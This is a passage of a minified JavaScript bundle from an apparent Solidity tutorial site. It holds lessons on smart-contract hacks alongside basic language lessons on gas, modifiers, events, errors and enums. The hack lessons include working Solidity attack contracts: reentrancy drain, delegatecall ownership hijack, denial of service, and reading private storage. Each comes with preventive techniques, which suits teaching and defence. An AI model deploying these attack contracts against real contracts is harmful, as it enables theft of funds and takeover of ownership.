i.a.createElement(P,{version:"0.5.16",title:"Honeypot",description:"An example of honeypot in Solidity",html:'<p>A honeypot is a trap to catch hackers.</p>\n<h3 id="vulnerability">Vulnerability</h3>\n<p>Combining two exploits, reentrancy and hiding malicious code, we can build a contract</p>\n<p>that will catch malicious users.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n/*\nBank is a contract that calls Logger to log events.\nBank.withdraw() is vulnerable to the reentrancy attack.\nSo a hacker tries to drain Ether from Bank.\nBut actually the reentracy exploit is a bait for hackers.\nBy deploying Bank with HoneyPot in place of the Logger, this contract becomes\na trap for hackers. Let&#39;s see how.\n\n1. Alice deploys HoneyPot\n2. Alice deploys Bank with the address of HoneyPot\n3. Alice deposits 1 Ether into Bank.\n4. Eve discovers the reentrancy exploit in Bank.withdraw and decides to hack it.\n5. Eve deploys Attack with the address of Bank\n6. Eve calls Attack.attack() with 1 Ether but the transaction fails.\n\nWhat happened?\nEve calls Attack.attack() and it starts withdrawing Ether from Bank.\nWhen the last Bank.withdraw() is about to complete, it calls logger.log().\nLogger.log() calls HoneyPot.log() and reverts. Transaction fails.\n*/\n\ncontract Bank {\n    mapping (address =&gt; uint) public balances;\n    Logger logger;\n\n    constructor(Logger _logger) public {\n        logger = Logger(_logger);\n    }\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n        logger.log(msg.sender, msg.value,"Deposit");\n    }\n\n    function withdraw(uint _amount) public {\n        require(_amount &lt;= balances[msg.sender], "Insufficient funds");\n\n        (bool sent, ) = msg.sender.call.value(_amount)("");\n        require(sent, "Failed to send Ether");\n\n        balances[msg.sender] -= _amount;\n\n        logger.log(msg.sender, _amount, "Withdraw");\n    }\n}\n\ncontract Logger {\n    event Log(address caller, uint amount, string action);\n\n    function log(address _caller, uint _amount, string memory _action) public {\n        emit Log(_caller, _amount, _action);\n    }\n}\n\n// Hacker tries to drain the Ethers stored in Bank by reentrancy.\ncontract Attack {\n    Bank bank;\n\n    constructor(Bank _bank) public {\n        bank = Bank(_bank);\n    }\n\n    function () external payable {\n        if (address(bank).balance &gt;= 1 ether) {\n            bank.withdraw(1 ether);\n        }\n    }\n\n    function attack() public payable {\n        bank.deposit.value(1 ether)();\n        bank.withdraw(1 ether);\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\n// Let&#39;s say this code is in a separate file so that others cannot read it.\ncontract HoneyPot {\n    function log(address _caller, uint _amount, string memory _action)\n        public\n    {\n        if (equal(_action, "Withdraw")) {\n            revert("It&#39;s a trap");\n        }\n    }\n\n    // Function to compare strings using keccak256\n    function equal(string memory _a, string memory _b)\n        public pure returns (bool)\n    {\n        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/hacks/hiding-malicious-code-with-external-contract",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Hiding Malicious Code with External Contract",description:"An example of exploit where malicious code is hidden in an external contract in Solidity",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p>In Solidity any address can be casted into specific contract,\neven if the contract at the address is not the one being casted.</p>\n<p>This can be exploited to hide malicious code. Let&#39;s see how.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n/*\nLet&#39;s say Alice can see the code of Foo and Bar but not Mal.\nIt is obvious to Alice that Foo.callBar() executes the code inside Bar.log().\nHowever Eve deploys Foo with the address of Mal, so that calling Foo.callBar()\nwill actually execute the code at Mal.\n*/\n\n/*\n1. Eve deploys Mal\n2. Eve deploys Foo with the address of Mal\n3. Alice calls Foo.callBar() after reading the code and judging that it is\n   safe to call.\n4. Although Alice expected Bar.log() to be execute, Mal.log() was executed.\n*/\n\ncontract Foo {\n    Bar bar;\n\n    constructor(address _bar) public {\n        bar = Bar(_bar);\n    }\n\n    function callBar() public {\n        bar.log();\n    }\n}\n\ncontract Bar {\n    event Log(string message);\n\n    function log() public {\n        emit Log("Bar was called");\n    }\n}\n\n// This code is hidden in a separate file\ncontract Mal {\n    event Log(string message);\n\n    // function () external {\n    //     emit Log("Mal was called");\n    // }\n\n    // Actually we can execute the same exploit even if this function does\n    // not exit by using the fallback\n    function log() public {\n        emit Log("Mal was called");\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Initialize a new contract inside the constructor</li>\n<li>Make the address of external contract <code>public</code> so that the code of the\nexternal contract can be reviewed</li>\n</ul>\n<pre><code class="language-solidity">Bar public bar;\n\nconstructor() public {\n    bar = new Bar();\n}</code></pre>\n'})}},{path:"/0.5/hacks/front-running",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Front Running",description:"An example of a Solidity contract vulnerable to front running",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p>Transactions take some time before they are mined. An attacker can watch the transaction pool\nand send a transaction, have it included in a block before the original transaction.\nThis mechanism can be abused to re-order transactions to the attacker&#39;s advantage.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n/*\nAlice creates a guessing game.\nYou win 10 ether if you can find the correct string that hashes to the target\nhash. Let&#39;s see how this contract is vulnerable to front running.\n*/\n\n/*\n1. Alice deploys FindThisHash with 10 Ether.\n2. Bob finds the correct string that will hash to the target hash. ("Ethereum")\n3. Bob calls solve("Ethereum") with gas price set to 15 gwei.\n4. Eve is watching the transaction pool for the answer to be submitted.\n5. Eve sees Bob&#39;s answer and calls solve("Ethereum") with a higher gas price\n   than Bob (100 gwei).\n6. Eve&#39;s transaction was mined before Bob&#39;s transaction.\n   Eve won the reward of 10 ether.\n\nWhat happened?\nTransactions take some time before they are mined.\nTransactions not yet mined are put in the transaction pool.\nTransactions with higher gas price are typically mined first.\nAn attacker can get the answer from the transaction pool, send a transaction\nwith a higher gas price so that their transaction will be included in a block\nbefore the original.\n*/\n\ncontract FindThisHash {\n    bytes32 constant public hash =\n      0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2;\n\n    constructor() public payable {}\n\n    function solve(string memory solution) public {\n        require(hash == keccak256(abi.encodePacked(solution)), "Incorrect answer");\n\n        (bool sent, ) = msg.sender.call.value(10 ether)("");\n        require(sent, "Failed to send Ether");\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>use commit-reveal scheme</li>\n<li>use submarine send</li>\n</ul>\n'})}},{path:"/0.5/hacks/denial-of-service",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Denail of Service",description:"An example of denial of service hack in Solidity",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p>There are many ways to attack a smart contract to make it unusable.</p>\n<p>One exploit we introduce here is denial of service by making the function to send Ether fail.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n/*\nThe goal of KingOfEther is to become the king by sending more Ether than\nthe previous king. Previous king will be refunded with the amount of Ether\nhe sent.\n*/\n\n/*\n1. Deploy KingOfEther\n2. Alice becomes the king by sending 1 Ether to claimThrone().\n2. Bob becomes the king by sending 2 Ether to claimThrone().\n   Alice receives a refund of 1 Ether.\n3. Deploy Attack with address of KingOfEther.\n4. Call attack with 3 Ether.\n5. Current king is the Attack contract and no one can become the new king.\n\nWhat happened?\nAttack became the king. All new challenge to claim the throne will be rejected\nsince Attack contract does not have a fallback function, denying to accept the\nEther sent from KingOfEther before the new king is set.\n*/\n\ncontract KingOfEther {\n    address public king;\n    uint public balance;\n\n    function claimThrone() external payable {\n        require(msg.value &gt; balance, "Need to pay more to become the king");\n\n        (bool sent, ) = king.call.value(balance)("");\n        require(sent, "Failed to send Ether");\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n}\n\ncontract Attack {\n    KingOfEther kingOfEther;\n\n    constructor(KingOfEther _kingOfEther) public {\n        kingOfEther = KingOfEther(_kingOfEther);\n    }\n\n    // You can also perform a DOS by consuming all gas using assert.\n    // This attack wil work even if the calling contract does not check\n    // whether the call was successful or not.\n    //\n    // function () external payable {\n    //     assert(false);\n    // }\n\n    function attack() public payable {\n        kingOfEther.claimThrone.value(msg.value)();\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<p>One way to prevent this is to allow the users to withdraw their Ether instead of sending it.</p>\n<p>Here is a example.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract KingOfEther {\n    address public king;\n    uint public balance;\n    mapping(address =&gt; uint) public balances;\n\n    function claimThrone() external payable {\n        require(msg.value &gt; balance, "Need to pay more to become the king");\n\n        balances[king] += balance;\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n\n    function withdraw() public {\n        require(msg.sender != king, "Current king cannot withdraw");\n\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call.value(amount)("");\n        require(sent, "Failed to send Ether");\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/hacks/delegatecall",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Delegatecall",description:"An example of exploits using delegatecall in Solidity",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p><code>delegatecall</code> is tricky to use and wrong usage or incorrect understanding\ncan lead to devastating results.</p>\n<p>You must keep 2 things in mind when using <code>delegatecall</code></p>\n<ol>\n<li><code>delegatecall</code> preserves context (storage, caller, etc...)</li>\n<li>storage layout must be the same for the contract calling <code>delegatecall</code> and the contract getting called</li>\n</ol>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n/*\nHackMe is a contract that uses delegatecall to execute code.\nIt it is not obvious that the owner of HackMe can be changed since there is no\nfunction inside HackMe to do so. However an attacker can hijack the\ncontract by exploiting delegatecall. Let&#39;s see how.\n\n1. Alice deploys Lib\n2. Alice deploys HackMe with address of Lib\n3. Eve deploys Attack with address of HackMe\n4. Eve calls Attack.attack()\n5. Attack is now the owner of HackMe\n\nWhat happened?\nEve called Attack.attack().\nAttack called the fallback function of HackMe sending the function\nselector of pwn(). HackMe forwards the call to Lib using delegatecall.\nHere msg.data contains the function selector of pwn().\nThis tells Solidity to call the function pwn() inside Lib.\nThe function pwn() updates the owner to msg.sender.\nDelegatecall runs the code of Lib using the context of HackMe.\nTherefore HackMe&#39;s storage was updated to msg.sender where msg.sender is the\ncaller of HackMe, in this case Attack.\n*/\n\ncontract Lib {\n    address public owner;\n\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n\ncontract HackMe {\n    address public owner;\n    Lib public lib;\n\n    constructor(Lib _lib) public {\n        owner = msg.sender;\n        lib = Lib(_lib);\n    }\n\n    function () external payable {\n        address(lib).delegatecall(msg.data);\n    }\n}\n\ncontract Attack {\n    address public hackMe;\n\n    constructor(address _hackMe) public {\n        hackMe = _hackMe;\n    }\n\n    function attack() public {\n        hackMe.call(abi.encodeWithSignature("pwn()"));\n    }\n}</code></pre>\n<p>Here is another example.</p>\n<p>You will need to understand how Solidity stores\nstate variables before you can understand this exploit.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n/*\nThis is a more sophisticated version of the previous exploit.\n\n1. Alice deploys Lib and HackMe with the address of Lib\n2. Eve deploys Attack with the address of HackMe\n3. Eve calls Attack.attack()\n4. Attack is now the owner of HackMe\n\nWhat happened?\nNotice that the state variables are not defined in the same manner in Lib\nand HackMe. This means that calling Lib.doSomething() will change the first\nstate variable inside HackMe, which happens to be the address of lib.\n\nInside attack(), the first call to doSomething() changes the address of lib\nstore in HackMe. Address of lib is now set to Attack.\nThe second call to doSomething() calls Attack.doSomething() and here we\nchange the owner.\n*/\n\ncontract Lib {\n    uint public someNumber;\n\n    function doSomething(uint _num) public {\n        someNumber = _num;\n    }\n}\n\ncontract HackMe {\n    address public lib;\n    address public owner;\n    uint public someNumber;\n\n    constructor(address _lib) public {\n        lib = _lib;\n        owner = msg.sender;\n    }\n\n    function doSomething(uint _num) public {\n        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));\n    }\n}\n\ncontract Attack {\n    // Make sure the storage layout is the same as HackMe\n    // This will allow us to correctly update the state variables\n    address public lib;\n    address public owner;\n    uint public someNumber;\n\n    HackMe public hackMe;\n\n    constructor(HackMe _hackMe) public {\n        hackMe = HackMe(_hackMe);\n    }\n\n    function attack() public {\n        // override address of lib\n        hackMe.doSomething(uint(address(this)));\n        // pass any number as input, the function doSomething() below will\n        // be called\n        hackMe.doSomething(1);\n    }\n\n    // function signature must match HackMe.doSomething()\n    function doSomething(uint _num) public {\n        owner = address(this);\n    }\n}\n</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Use stateless <code>Library</code></li>\n</ul>\n'})}},{path:"/0.5/hacks/block-timestamp-manipulation",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Block Timestamp Manipulation",description:"An example of a Solidity contract vulnerable to block timestamp manipulation",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p><code>block.timestamp</code> can be manipulated by miners with the following constraints</p>\n<ul>\n<li>it cannot be stamped with an earlier time than its parent</li>\n<li>it cannot be too far in the future</li>\n</ul>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n/*\nRoulette is a game where you can win all of the Ether in the contract\nif you can submit a transaction at a specific timing.\nA player needs to send 10 Ether and wins if the block.timestamp % 15 == 0.\n*/\n\n/*\n1. Deploy Roulette with 10 Ether\n2. Eve runs a powerful miner that can manipulate the block timestamp.\n3. Eve sets the block.timestamp to a number in the future that is divisible by\n   15 and finds the target block hash.\n4. Eve&#39;s block is successfully included into the chain, Eve wins the\n   Roulette game.\n*/\n\ncontract Roulette {\n    uint public pastBlockTime;\n\n    constructor() public payable {}\n\n    function spin() external payable {\n        require(msg.value == 10 ether); // must send 10 ether to play\n        require(now != pastBlockTime); // only 1 transaction per block\n\n        pastBlockTime = block.timestamp;\n\n        if(now % 15 == 0) {\n            (bool sent, ) = msg.sender.call.value(address(this).balance)("");\n            require(sent, "Failed to send Ether");\n        }\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Don&#39;t use <code>block.timestamp</code> for a source of entropy and random number</li>\n</ul>\n'})}},{path:"/0.5/hacks/accessing-private-data",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Accessing Private Data",description:"An example of accessing private data from a Solidity smart contract",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p>All data on a smart contract can be read.</p>\n<p>Let&#39;s see how we can read <code>private</code> data. In the process you will learn how Solidity stores state variables.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n/*\nNote: cannot use web3 on JVM, so use the contract deployed on ropsten\nNote: browser Web3 is old so use Web3 from truffle console\n\nContract deployed on Ropsten\n0x3505a02BCDFbb225988161a95528bfDb279faD6b\n*/\n\n/*\n# Storage\n- 2 ** 256 slots\n- 32 bytes for each slot\n- data is stored sequentially in the order of declaration\n- storage is optimized to save space. If neighboring variables fit in a single\n  32 bytes, then they are packed into the same slot, starting from the right\n*/\n\ncontract Vault {\n    // slot 0\n    uint public count = 123;\n    // slot 1\n    address public owner = msg.sender;\n    bool public isTrue = true;\n    uint16 public u16 = 31;\n    // slot 2\n    bytes32 private password;\n\n    // constants do not use storage\n    uint public constant someConst = 123;\n\n    // slot 3, 4, 5 (one for each array element)\n    bytes32[3] public data;\n\n    struct User {\n        uint id;\n        bytes32 password;\n    }\n\n    // slot 6 - length of array\n    // starting from slot hash(6) - array elements\n    // slot where array element is stored = keccak256(slot)) + (index * elementSize)\n    // where slot = 6 and elementSize = 2 (1 (uint) +  1 (bytes32))\n    User[] private users;\n\n    // slot 7 - empty\n    // entries are stored at hash(key, slot)\n    // where slot = 7, key = map key\n    mapping(uint =&gt; User) private idToUser;\n\n    constructor(bytes32 _password) public {\n        password = _password;\n    }\n\n    function addUser(bytes32 _password) public {\n        User memory user = User({\n            id: users.length,\n            password: _password\n        });\n\n        users.push(user);\n        idToUser[user.id] = user;\n    }\n\n    function getArrayLocation(uint slot, uint index, uint elementSize) public pure returns (uint) {\n        return uint(keccak256(abi.encodePacked(slot))) + (index * elementSize);\n    }\n\n    function getMapLocation(uint slot, uint key) public pure returns (uint) {\n        return uint(keccak256(abi.encodePacked(key, slot)));\n    }\n}\n\n/*\nslot 0 - count\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", 0, console.log)\nslot 1 - u16, isTrue, owner\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", 1, console.log)\nslot 2 - password\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", 2, console.log)\n\nslot 6 - array length\ngetArrayLocation(6, 0, 2)\nweb3.utils.numberToHex("111414077815863400510004064629973595961579173665589224203503662149373724986687")\nNote: We can also use web3 to get data location\nweb3.utils.soliditySha3({ type: "uint", value: 6 })\n1st user\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", "0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f", console.log)\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", "0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d40", console.log)\nNote: use web3.toAscii to convert bytes32 to alphabet\n2nd user\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", "0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d41", console.log)\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", "0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d42", console.log)\n\nslot 7 - empty\ngetMapLocation(7, 1)\nweb3.utils.numberToHex("81222191986226809103279119994707868322855741819905904417953092666699096963112")\nNote: We can also use web3 to get data location\nweb3.utils.soliditySha3({ type: "uint", value: 1 }, {type: "uint", value: 7})\nuser 1\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", "0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b828", console.log)\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", "0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b829", console.log)\n*/</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Don&#39;t store sensitive information on the blockchain.</li>\n</ul>\n'})}},{path:"/0.5/gas",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Gas",description:"Example of gas and gas limit in Solidity",html:'<h3 id="how-much-ether-do-you-need-to-pay-for-a-transaction">How much <code>ether</code> do you need to pay for a transaction?</h3>\n<p>You pay <code>gas spent * gas price</code> amount of <code>ether</code>, where</p>\n<ul>\n<li><code>gas</code> is a unit of computation</li>\n<li><code>gas spent</code> is the total amount of <code>gas</code> used in a transaction</li>\n<li><code>gas price</code> is how much <code>ether</code> you are willing to pay per <code>gas</code></li>\n</ul>\n<p>Transactions with higher gas price have higher priority to be included in a block.</p>\n<p>Unspent gas will be refunded.</p>\n<h3 id="gas-limit">Gas Limit</h3>\n<p>There are 2 upper bounds to the amount of gas you can spend</p>\n<ul>\n<li><code>gas limit</code> (max amount of gas your willing to use for your transaction, set by you)</li>\n<li><code>block gas limit</code> (max amount of gas allowed in a block, set by the network)</li>\n</ul>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Gas {\n    uint public i = 0;\n\n    // Using up all of the gas that you send causes your transaction to fail.\n    // State changes are undone.\n    // Gas spent are not refunded.\n    function forever() public {\n        // Here we run a loop until all of the gas are spent\n        // and the transaction fails\n        while(true) {\n            i += 1;\n        }\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/function-modifier",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Function Modifier",description:"Example of how to write function modifier in Solidity",html:'<p>Modifiers are code that can be run before and / or after a function call.</p>\n<p>Modifiers can be used to:</p>\n<ul>\n<li>Restrict access</li>\n<li>Validate inputs</li>\n<li>Guard against reentrancy hack</li>\n</ul>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract FunctionModifier {\n    // We will use these variables to demonstrate how to use\n    // modifiers.\n    address public owner;\n    uint public x = 10;\n    bool public locked;\n\n    constructor() public {\n        // Set the transaction sender as the owner of the contract.\n        owner = msg.sender;\n    }\n\n    // Modifier to check that the caller is the owner of\n    // the contract.\n    modifier onlyOwner() {\n        require(msg.sender == owner, "Not owner");\n        // Underscore is a special character only used inside\n        // a function modifier and it tells Solidity to\n        // execute the rest of the code.\n        _;\n    }\n\n    // Modifiers can take inputs. This modifier checks that the\n    // address passed in is not the zero address.\n    modifier validAddress(address _addr) {\n        require(_addr != address(0), "Not valid address");\n        _;\n    }\n\n    function changeOwner(address _newOwner)\n        public\n        onlyOwner\n        validAddress(_newOwner)\n    {\n        owner = _newOwner;\n    }\n\n    // Modifiers can be called before and / or after a function.\n    // This modifier prevents a function from being called while\n    // it is still executing.\n    modifier noReentrancy() {\n        require(!locked, "No reentrancy");\n\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    function decrement(uint i) public noReentrancy {\n        x -= i;\n\n        if (i &gt; 1) {\n            decrement(i - 1);\n        }\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/function",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Function",description:"Example of how to write functions in Solidity",html:'<p>There are several ways to return outputs from a function.</p>\n<p>Public functions cannot accept certain data types as inputs or outputs</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Function {\n    // Functions can return multiple values.\n    function returnMany() public pure returns (uint, bool, uint) {\n        return (1, true, 2);\n    }\n\n    // Return values can be named.\n    function named() public pure returns (uint x, bool b, uint y) {\n        return (1, true, 2);\n    }\n\n    // Return values can be assigned to their name.\n    // In this case the return statement can be omitted.\n    function assigned() public pure returns (uint x, bool b, uint y) {\n        x = 1;\n        b = true;\n        y = 2;\n    }\n\n    // Use destructing assignment when calling another\n    // function that returns multiple values.\n    function destructingAssigments()\n        public pure returns (uint, bool, uint, uint, uint)\n    {\n        (uint i, bool b, uint j) =  returnMany();\n\n        // Values can be left out.\n        (uint x, , uint y) = (4, 5, 6);\n\n        return (i, b, j, x, y);\n    }\n\n    // Cannot use map for neither input nor output\n\n    // Can use array for input\n    function arrayInput(uint[] memory _arr) public {\n    }\n\n    // Can use array for output\n    uint[] public arr;\n\n    function arrayOutput() public view returns (uint[] memory) {\n        return arr;\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/first-app",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"First Application",description:"Example of smart contract in Solidity",html:'<p>Here is a simple contract that you can get, increment and decrement the count store in this contract.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Counter {\n    uint public count;\n\n    // Function to get the current count\n    function get() public view returns (uint) {\n        return count;\n    }\n\n    // Function to increment count by 1\n    function inc() public {\n        count += 1;\n    }\n\n    // Function to decrement count by 1\n    function dec() public {\n        count -= 1;\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/fallback",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Fallback",description:"Example of how to use fallback in Solidity",html:'<p>A <code>fallback function</code> is an anonymous function that does not take any arguments and does not return anything.</p>\n<p>Fallback functions are executed when</p>\n<ul>\n<li>calling a function that does not exist</li>\n<li>sending Ether directly to a contract</li>\n</ul>\n<p><code>Fallback</code> functions have a 2300 gas limit when called by <code>transfer</code> or <code>send</code>.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Fallback {\n    event Log(uint gas);\n\n    // Fallback function must be declared as external.\n    function () external payable {\n        // send / transfer (forwards 2300 gas to this fallback function)\n        // call (forwards all of the gas)\n        emit Log(gasleft());\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\ncontract SendToFallback {\n    function transferToFallback(address payable _to) public payable {\n        _to.transfer(msg.value);\n    }\n\n    function callFallback(address payable _to) public payable {\n        (bool sent,) = _to.call.value(msg.value)("");\n        require(sent, "Failed to send Ether");\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/events",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Events",description:"Example of how to emit events in Solidity",html:'<p><code>Events</code> allow logging to the Ethereum blockchain. Some use cass for events are:</p>\n<ul>\n<li>Listening for events and updating user interface</li>\n<li>A cheap form of storage</li>\n</ul>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Event {\n    // Event declaration\n    // Up to 3 parameters can be indexed.\n    // Indexed parameters helps you filter the logs by the indexed parameter\n    event Log(address indexed sender, string message);\n    event AnotherLog();\n\n    function test() public {\n        emit Log(msg.sender, "Hello World!");\n        emit Log(msg.sender, "Hello EVM!");\n        emit AnotherLog();\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/ether-units",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Ether and Wei",description:"An example of Ether and Wei in Solidity",html:'<p>Transactions are paid with <code>ether</code>.</p>\n<p>Similar to how one dollar is equal to 100 cent, one <code>ether</code> is equal to 10<sup>18</sup> <code>wei</code>.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract EtherUnits {\n    uint public oneWei = 1 wei;\n    // 1 wei is equal to 1\n    bool public isOneWei = 1 wei == 1;\n\n    uint public oneEther = 1 ether;\n    // 1 ether is equal to 10^18\n    bool public isOneEther = 1 ether == 1e18;\n}\n</code></pre>\n'})}},{path:"/0.5/error",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Error",description:"Example of how to throw errors in Solidity",html:'<p>An error will undo all changes made to the state during a transaction.</p>\n<p>You can throw an error by calling <code>require</code>, <code>revert</code> or <code>assert</code>.</p>\n<ul>\n<li><code>require</code> is used to validate inputs and conditions before execution.</li>\n<li><code>revert</code> is similar to <code>require</code>. See the code below for details.</li>\n<li><code>assert</code> is used to check for code that should never be false. Failing\nassertion probably means that there is a bug.</li>\n</ul>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Error {\n    function testRequire(uint _i) public {\n        // Require should be used to validate conditions such as:\n        // - inputs\n        // - conditions before execution\n        // - return values from calls to other functions\n        require(_i &gt; 10, "Input must be greater than 10");\n    }\n\n    function testRevert(uint _i) public {\n        // Revert is useful when the condition to check is complex.\n        // This code does the exact same thing as the example above\n        if (_i &lt;= 10) {\n            revert("Input must be greater than 10");\n        }\n    }\n\n    uint public num;\n\n    function testAssert() public {\n        // Assert should only be used to test for internal errors,\n        // and to check invariants.\n\n        // Here we assert that num is always equal to 0\n        // since it is impossible to update the value of num\n        assert(num == 0);\n    }\n}\n</code></pre>\n<p>Here is another example</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Account {\n    uint public balance;\n    uint public constant MAX_UINT = 2 ** 256 - 1;\n\n    function deposit(uint _amount) public {\n        uint oldBalance = balance;\n        uint newBalance = balance + _amount;\n\n        // balance + _amount does not overflow if balance + _amount &gt;= balance\n        require(newBalance &gt;= oldBalance, "Overflow");\n\n        balance = newBalance;\n\n        assert(balance &gt;= oldBalance);\n    }\n\n    function withdraw(uint _amount) public {\n        uint oldBalance = balance;\n\n        // balance - _amount does not underflow if balance &gt;= _amount\n        require(balance &gt;= _amount, "Underflow");\n\n        if (balance &lt; _amount) {\n            revert("Underflow");\n        }\n\n        balance -= _amount;\n\n        assert(balance &lt;= oldBalance);\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/enum",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Enum",description:"Example of enums in Solidity",html:'<p>Solidity support enumerables and they are useful to model choice and keep track of state.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\ncontract Enum {\n    // Enum representing shipping status\n    enum Status {\n        Pending,\n        Shipped,\n        Accepted,\n        Rejected,\n        Canceled\n    }\n\n    // Default value is the first element listed in\n    // definition of the type, in this case "Pending"\n    Status public status;\n\n    // Returns uint\n    // Pending  - 0\n    // Shipped  - 1\n    // Accepted - 2\n    // Rejected - 3\n    // Canceled - 4\n    function get() public view returns (Status) {\n        return status;\n    }\n\n    // Update status by passing uint into input\n    function set(Status _status) public {\n        status = _status;\n    }\n\n    // You can update to a specific enum like this\n    function cancel() public {\n        status = Status.Canceled;\n    }\n\n    // delete resets the enum to it&#39;s first value, 0\n    function reset() public {\n        delete status;\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/delegatecall",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Delegatecall",description:"Example of how to use deletegatecall in Solidity",html:'<p><code>delegatecall</code> is a low level function similar to <code>call</code>.</p>\n<p>When contract <code>A</code> executes <code>delegatecall</code> to contract <code>B</code>, <code>B</code>&#39;s code is excuted</p>\n<p>with contract <code>A</code>&#39;s storage, <code>msg.sender</code> and <code>msg.value</code>.</p>\n<pre><code class="language-solidity">pragma solidity ^0.5.16;\n\n// NOTE: Deploy this contract first\ncontract B {\n    // NOTE: storage layout must be the same as contract A\n    uint public num;\n    address public sender;\n    uint public value;\n\n    function setVars(uint _num) public payable {\n        num = _num;\n        sender = msg.sender;\n        value = msg.value;\n    }\n}\n\ncontract A {\n    uint public num;\n    address public sender;\n    uint public value;\n\n    function setVars(address _contract, uint _num) public payable {\n        // A&#39;s storage is set, B is not modified.\n        (bool success, bytes memory data) = _contract.delegatecall(\n            abi.encodeWithSignature("setVars(uint256)", _num)\n        );\n    }\n}\n</code></pre>\n'})}},{path:"/0.5/data-locations",component:function(){return i.a.createElement(P,{version:"0.5.16",title:"Data Locations - Storage, Memory and Calldata",description:"Data locations - storage, memory and calldata",html:'<p>Variables are declared as either <code>storage</code>, <code>memory</code> or <code>calldata</code> to explicitly\nspecify the location of the 